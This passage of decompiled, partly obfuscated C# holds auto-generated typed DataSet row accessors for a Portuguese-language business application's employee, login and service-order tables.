			[DebuggerNonUserCode]
			public string CIDADE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.CIDADEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(15690), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.CIDADEColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string UF
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.UFColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(15822), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.UFColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double CEP
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FUNCIONARIOS.CEPColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(15946), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.CEPColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public double TEL_CEL
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FUNCIONARIOS.TEL_CELColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(16072), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.TEL_CELColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double TEL_RES
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FUNCIONARIOS.TEL_RESColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(16206), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.TEL_RESColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string COMPLEMENTO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.COMPLEMENTOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(16340), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.COMPLEMENTOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DateTime DAT_NASC
			{
				get
				{
					try
					{
						return Conversions.ToDate(base[tableTB_FUNCIONARIOS.DAT_NASCColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(16482), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.DAT_NASCColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DateTime DAT_ADMISAO
			{
				get
				{
					try
					{
						return Conversions.ToDate(base[tableTB_FUNCIONARIOS.DAT_ADMISAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(16618), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.DAT_ADMISAOColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string EMAIL
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.EMAILColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(16760), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.EMAILColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public string FACEBOOK
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.FACEBOOKColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(16890), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.FACEBOOKColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public double CPF
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FUNCIONARIOS.CPFColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(17026), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.CPFColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double RG
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FUNCIONARIOS.RGColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(17152), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.RGColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double CNPJ
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FUNCIONARIOS.CNPJColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(17276), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.CNPJColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public double INS
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FUNCIONARIOS.INSColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(17404), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.INSColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string EMISSOR
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.EMISSORColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(17530), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.EMISSORColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public double COMISAO
			{
				get
				{
					try
					{
						return Conversions.ToDouble(base[tableTB_FUNCIONARIOS.COMISAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(17664), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.COMISAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string OBSERVACAO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_FUNCIONARIOS.OBSERVACAOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(17798), ex);
					}
				}
				set
				{
					base[tableTB_FUNCIONARIOS.OBSERVACAOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal TB_FUNCIONARIOSRow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_FUNCIONARIOS = (TB_FUNCIONARIOSDataTable)base.Table;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsNOME_FUNCIONARIONull()
			{
				return IsNull(tableTB_FUNCIONARIOS.NOME_FUNCIONARIOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetNOME_FUNCIONARIONull()
			{
				base[tableTB_FUNCIONARIOS.NOME_FUNCIONARIOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsTIPO_FUNCIONARIONull()
			{
				return IsNull(tableTB_FUNCIONARIOS.TIPO_FUNCIONARIOColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetTIPO_FUNCIONARIONull()
			{
				base[tableTB_FUNCIONARIOS.TIPO_FUNCIONARIOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsAPELIDONull()
			{
				return IsNull(tableTB_FUNCIONARIOS.APELIDOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetAPELIDONull()
			{
				base[tableTB_FUNCIONARIOS.APELIDOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsENDERECONull()
			{
				return IsNull(tableTB_FUNCIONARIOS.ENDERECOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetENDERECONull()
			{
				base[tableTB_FUNCIONARIOS.ENDERECOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsBAIRRONull()
			{
				return IsNull(tableTB_FUNCIONARIOS.BAIRROColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetBAIRRONull()
			{
				base[tableTB_FUNCIONARIOS.BAIRROColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCIDADENull()
			{
				return IsNull(tableTB_FUNCIONARIOS.CIDADEColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetCIDADENull()
			{
				base[tableTB_FUNCIONARIOS.CIDADEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsUFNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.UFColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetUFNull()
			{
				base[tableTB_FUNCIONARIOS.UFColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCEPNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.CEPColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCEPNull()
			{
				base[tableTB_FUNCIONARIOS.CEPColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsTEL_CELNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.TEL_CELColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetTEL_CELNull()
			{
				base[tableTB_FUNCIONARIOS.TEL_CELColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsTEL_RESNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.TEL_RESColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetTEL_RESNull()
			{
				base[tableTB_FUNCIONARIOS.TEL_RESColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCOMPLEMENTONull()
			{
				return IsNull(tableTB_FUNCIONARIOS.COMPLEMENTOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCOMPLEMENTONull()
			{
				base[tableTB_FUNCIONARIOS.COMPLEMENTOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsDAT_NASCNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.DAT_NASCColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetDAT_NASCNull()
			{
				base[tableTB_FUNCIONARIOS.DAT_NASCColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsDAT_ADMISAONull()
			{
				return IsNull(tableTB_FUNCIONARIOS.DAT_ADMISAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetDAT_ADMISAONull()
			{
				base[tableTB_FUNCIONARIOS.DAT_ADMISAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsEMAILNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.EMAILColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetEMAILNull()
			{
				base[tableTB_FUNCIONARIOS.EMAILColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsFACEBOOKNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.FACEBOOKColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetFACEBOOKNull()
			{
				base[tableTB_FUNCIONARIOS.FACEBOOKColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsCPFNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.CPFColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCPFNull()
			{
				base[tableTB_FUNCIONARIOS.CPFColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsRGNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.RGColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetRGNull()
			{
				base[tableTB_FUNCIONARIOS.RGColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCNPJNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.CNPJColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCNPJNull()
			{
				base[tableTB_FUNCIONARIOS.CNPJColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsINSNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.INSColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetINSNull()
			{
				base[tableTB_FUNCIONARIOS.INSColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsEMISSORNull()
			{
				return IsNull(tableTB_FUNCIONARIOS.EMISSORColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetEMISSORNull()
			{
				base[tableTB_FUNCIONARIOS.EMISSORColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsCOMISAONull()
			{
				return IsNull(tableTB_FUNCIONARIOS.COMISAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetCOMISAONull()
			{
				base[tableTB_FUNCIONARIOS.COMISAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsOBSERVACAONull()
			{
				return IsNull(tableTB_FUNCIONARIOS.OBSERVACAOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetOBSERVACAONull()
			{
				base[tableTB_FUNCIONARIOS.OBSERVACAOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

		public class TB_LOGINRow : DataRow
		{
			private TB_LOGINDataTable tableTB_LOGIN;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public int Código
			{
				get
				{
					return Conversions.ToInteger(base[tableTB_LOGIN.CódigoColumn]);
				}
				set
				{
					base[tableTB_LOGIN.CódigoColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string FUNCIONARIO
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_LOGIN.FUNCIONARIOColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(17938), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.FUNCIONARIOColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int SENHA
			{
				get
				{
					try
					{
						return Conversions.ToInteger(base[tableTB_LOGIN.SENHAColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(18066), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.SENHAColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string GERENTE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_LOGIN.GERENTEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(18182), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.GERENTEColumn] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public int SENHA1
			{
				get
				{
					try
					{
						return Conversions.ToInteger(base[tableTB_LOGIN.SENHA1Column]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(18302), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.SENHA1Column] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string PRESIDENTE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_LOGIN.PRESIDENTEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(18420), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.PRESIDENTEColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int SENHA2
			{
				get
				{
					try
					{
						return Conversions.ToInteger(base[tableTB_LOGIN.SENHA2Column]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(18546), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.SENHA2Column] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string SUPERVISOR
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_LOGIN.SUPERVISORColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(18664), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.SUPERVISORColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int SENHA3
			{
				get
				{
					try
					{
						return Conversions.ToInteger(base[tableTB_LOGIN.SENHA3Column]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(18790), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.SENHA3Column] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public string SUB_GERENTE
			{
				get
				{
					try
					{
						return Conversions.ToString(base[tableTB_LOGIN.SUB_GERENTEColumn]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(18908), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.SUB_GERENTEColumn] = value;
				}
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int SENHA4
			{
				get
				{
					try
					{
						return Conversions.ToInteger(base[tableTB_LOGIN.SENHA4Column]);
					}
					catch (InvalidCastException ex)
					{
						ProjectData.SetProjectError((Exception)ex);
						throw new StrongTypingException(\u0004.\u0001.\u0001(19036), ex);
					}
				}
				set
				{
					base[tableTB_LOGIN.SENHA4Column] = value;
				}
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_LOGINRow(DataRowBuilder rb)
			{
				\u0008.\u0002.\u0001();
				base..ctor(rb);
				tableTB_LOGIN = (TB_LOGINDataTable)base.Table;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsFUNCIONARIONull()
			{
				return IsNull(tableTB_LOGIN.FUNCIONARIOColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetFUNCIONARIONull()
			{
				base[tableTB_LOGIN.FUNCIONARIOColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsSENHANull()
			{
				return IsNull(tableTB_LOGIN.SENHAColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetSENHANull()
			{
				base[tableTB_LOGIN.SENHAColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsGERENTENull()
			{
				return IsNull(tableTB_LOGIN.GERENTEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetGERENTENull()
			{
				base[tableTB_LOGIN.GERENTEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsSENHA1Null()
			{
				return IsNull(tableTB_LOGIN.SENHA1Column);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetSENHA1Null()
			{
				base[tableTB_LOGIN.SENHA1Column] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsPRESIDENTENull()
			{
				return IsNull(tableTB_LOGIN.PRESIDENTEColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetPRESIDENTENull()
			{
				base[tableTB_LOGIN.PRESIDENTEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsSENHA2Null()
			{
				return IsNull(tableTB_LOGIN.SENHA2Column);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetSENHA2Null()
			{
				base[tableTB_LOGIN.SENHA2Column] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsSUPERVISORNull()
			{
				return IsNull(tableTB_LOGIN.SUPERVISORColumn);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetSUPERVISORNull()
			{
				base[tableTB_LOGIN.SUPERVISORColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsSENHA3Null()
			{
				return IsNull(tableTB_LOGIN.SENHA3Column);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void SetSENHA3Null()
			{
				base[tableTB_LOGIN.SENHA3Column] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public bool IsSUB_GERENTENull()
			{
				return IsNull(tableTB_LOGIN.SUB_GERENTEColumn);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetSUB_GERENTENull()
			{
				base[tableTB_LOGIN.SUB_GERENTEColumn] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public bool IsSENHA4Null()
			{
				return IsNull(tableTB_LOGIN.SENHA4Column);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void SetSENHA4Null()
			{
				base[tableTB_LOGIN.SENHA4Column] = RuntimeHelpers.GetObjectValue(Convert.DBNull);
			}
		}

		public class TB_ORDEMSERVICORow : DataRow
		{
			private TB_ORDEMSERVICODataTable tableTB_ORDEMSERVICO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
